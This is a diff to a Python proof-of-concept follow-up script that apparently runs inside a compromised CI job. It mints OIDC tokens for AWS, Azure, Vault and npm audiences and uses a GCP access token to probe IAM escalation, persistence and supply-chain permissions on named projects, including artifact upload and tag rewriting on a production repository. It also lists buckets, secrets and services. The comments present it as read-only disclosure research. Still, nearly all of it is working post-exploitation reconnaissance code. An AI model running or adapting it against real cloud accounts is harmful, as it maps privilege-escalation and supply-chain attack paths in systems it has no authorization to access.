@@ -18,6 +18,8 @@ import json
 import os
 import subprocess
 import sys
+import urllib.error
+import urllib.parse
 import urllib.request
 
 
@@ -236,6 +238,167 @@ if oidc_url and oidc_tok:
         print(f"  ERROR: {e}")
 else:
     print("\n--- [6] OIDC JWT claims --- SKIPPED (env vars not present)")
+
+# ---------------------------------------------------------------------------
+# 6b. OIDC JWT for additional audiences — show what other federated trusts
+#     (AWS, Azure, npm provenance, Vault) would see. Just dump aud/sub.
+# ---------------------------------------------------------------------------
+if oidc_url and oidc_tok:
+    print("\n--- [6b] OIDC JWT for additional audiences (aud + sub only) ---")
+    for aud in (
+        "sts.amazonaws.com",
+        "api://AzureADTokenExchange",
+        "https://nuget.pkg.github.com",
+        "https://vault.example.com",
+        "npm",
+    ):
+        try:
+            req = urllib.request.Request(
+                f"{oidc_url}&audience={urllib.parse.quote(aud)}",
+                headers={"Authorization": f"Bearer {oidc_tok}"},
+            )
+            body = urllib.request.urlopen(req, timeout=10).read()
+            jwt = json.loads(body)["value"]
+            payload_b64 = jwt.split(".")[1]
+            payload_b64 += "=" * (-len(payload_b64) % 4)
+            claims = json.loads(base64.urlsafe_b64decode(payload_b64))
+            print(f"  requested_aud={aud!r:40}  issued_aud={claims.get('aud')!r}  sub={claims.get('sub')!r}")
+        except Exception as e:
+            print(f"  requested_aud={aud!r:40}  ERROR={type(e).__name__}: {e}")
+
+# ---------------------------------------------------------------------------
+# 7. testIamPermissions probes — GCP's purpose-built capability check API.
+#    Asks "do I have permission X?" without exercising it. Returns a list of
+#    permissions you actually have from the list you ask about. Read-only.
+#    This converts "role X exists in project" (from [4]) into "the federated
+#    SA confirmed has permission Y" (concrete capability).
+# ---------------------------------------------------------------------------
+print("\n--- [7] testIamPermissions probes (GCP capability discovery) ---")
+
+ACCESS_TOKEN = run_capture(
+    "gcloud auth application-default print-access-token 2>/dev/null"
+).strip()
+
+if not ACCESS_TOKEN or len(ACCESS_TOKEN) < 50:
+    print("  SKIPPED — no access token to probe with")
+else:
+    def probe(label: str, url: str, perms: list) -> None:
+        try:
+            req = urllib.request.Request(
+                url,
+                data=json.dumps({"permissions": perms}).encode(),
+                headers={
+                    "Authorization": f"Bearer {ACCESS_TOKEN}",
+                    "Content-Type": "application/json",
+                },
+                method="POST",
+            )
+            body = urllib.request.urlopen(req, timeout=15).read()
+            granted = json.loads(body).get("permissions", [])
+            print(f"\n  [{label}]")
+            print(f"    requested: {len(perms)} permissions")
+            print(f"    granted:   {len(granted)} of {len(perms)}")
+            for p in perms:
+                marker = "GRANTED" if p in granted else "denied "
+                print(f"      [{marker}] {p}")
+        except urllib.error.HTTPError as e:
+            err_body = e.read().decode("utf-8", errors="replace")[:300]
+            print(f"\n  [{label}]  HTTP {e.code}: {err_body}")
+        except Exception as e:
+            print(f"\n  [{label}]  ERROR: {type(e).__name__}: {e}")
+
+    # 7.1 — Persistence + escalation primitives on adk-devops project
+    probe(
+        "adk-devops :: IAM persistence/escalation",
+        "https://cloudresourcemanager.googleapis.com/v3/projects/adk-devops:testIamPermissions",
+        [
+            "iam.workloadIdentityPools.create",
+            "iam.workloadIdentityPoolProviders.create",
+            "iam.serviceAccounts.create",
+            "iam.serviceAccountKeys.create",
+            "iam.roles.create",
+            "resourcemanager.projects.setIamPolicy",
+            "iam.serviceAccounts.actAs",
+            "iam.serviceAccounts.getAccessToken",
+        ],
+    )
+
+    # 7.2 — Resource creation in adk-devops
+    probe(
+        "adk-devops :: resource creation",
+        "https://cloudresourcemanager.googleapis.com/v3/projects/adk-devops:testIamPermissions",
+        [
+            "cloudbuild.builds.create",
+            "aiplatform.endpoints.create",
+            "aiplatform.models.upload",
+            "storage.buckets.create",
+            "storage.objects.create",
+            "secretmanager.secrets.create",
+            "secretmanager.versions.access",
+            "run.services.create",
+            "compute.instances.create",
+        ],
+    )
+
+    # 7.3 — Supply-chain primitive on the AR repo we're pulling from
+    probe(
+        "AR :: starter-pack@production-ai-template (SUPPLY CHAIN)",
+        "https://artifactregistry.googleapis.com/v1/projects/production-ai-template/locations/europe-west4/repositories/starter-pack:testIamPermissions",
+        [
+            "artifactregistry.repositories.uploadArtifacts",
+            "artifactregistry.versions.delete",
+            "artifactregistry.tags.update",
+            "artifactregistry.tags.delete",
+            "artifactregistry.tags.create",
+            "artifactregistry.repositories.update",
+            "artifactregistry.repositories.setIamPolicy",
+        ],
+    )
+
+    # 7.4 — Cross-project escalation extent (production-ai-template)
+    probe(
+        "production-ai-template :: cross-project escalation",
+        "https://cloudresourcemanager.googleapis.com/v3/projects/production-ai-template:testIamPermissions",
+        [
+            "resourcemanager.projects.get",
+            "resourcemanager.projects.setIamPolicy",
+            "iam.workloadIdentityPools.create",
+            "iam.serviceAccounts.create",
+            "iam.serviceAccountKeys.create",
+            "cloudbuild.builds.create",
+            "secretmanager.versions.access",
+            "storage.buckets.create",
+        ],
+    )
+
+# ---------------------------------------------------------------------------
+# 8. Resource enumeration — names only, no content.
+# ---------------------------------------------------------------------------
+print("\n--- [8] Resource enumeration (names only, no object content) ---")
+
+for label, cmd in (
+    ("buckets@adk-devops",
+     "gcloud storage buckets list --project=adk-devops --format='value(name)' 2>&1"),
+    ("secrets@adk-devops (NAMES ONLY, no values accessed)",
+     "gcloud secrets list --project=adk-devops --format='value(name)' 2>&1"),
+    ("run-services@adk-devops",
+     "gcloud run services list --project=adk-devops --format='value(metadata.name)' 2>&1"),
+    ("recent-builds@adk-devops",
+     "gcloud builds list --project=adk-devops --limit=5 --format='value(id)' 2>&1"),
+    ("buckets@production-ai-template",
+     "gcloud storage buckets list --project=production-ai-template --format='value(name)' 2>&1"),
+    ("ar-repos@production-ai-template",
+     "gcloud artifacts repositories list --project=production-ai-template --format='value(name)' 2>&1"),
+):
+    out = run_capture(cmd, timeout=30)
+    lines = [ln for ln in out.strip().splitlines() if ln.strip()]
+    is_error = any(s in out for s in ("ERROR:", "PERMISSION_DENIED", "denied", "Forbidden"))
+    print(f"\n  [{label}]")
+    if is_error and len(lines) < 5:
+        print(f"    access_check: DENIED or ERROR  (output_sha256={hash_str(out)})")
+        print(f"    first_line: {lines[0][:120] if lines else '(empty)'}")
+    else:
+        print(f"    access_check: GRANTED  count={len(lines)}  list_sha256={hash_str(out)}")
 
 print("\n" + "=" * 64)
 print("[PoC FOLLOWUP] END")
